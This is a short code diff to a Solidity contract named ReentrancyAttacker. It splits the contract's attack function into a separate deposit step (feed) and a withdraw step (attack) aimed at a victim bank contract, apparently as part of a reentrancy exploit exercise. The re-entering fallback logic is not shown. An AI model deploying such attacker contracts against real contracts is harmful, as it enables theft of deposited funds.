@@ -15,9 +15,13 @@ contract ReentrancyAttacker {
         victimContract = IVictimBank(_victim);
     }
 
-    function attack() external payable {
+    function feed() external payable {
         require(msg.sender == owner, "Not owner");
         victimContract.deposit{value: msg.value}();
+    }
+
+    function attack() external {
+        require(msg.sender == owner, "Not owner");
         victimContract.withdraw();
     }
 
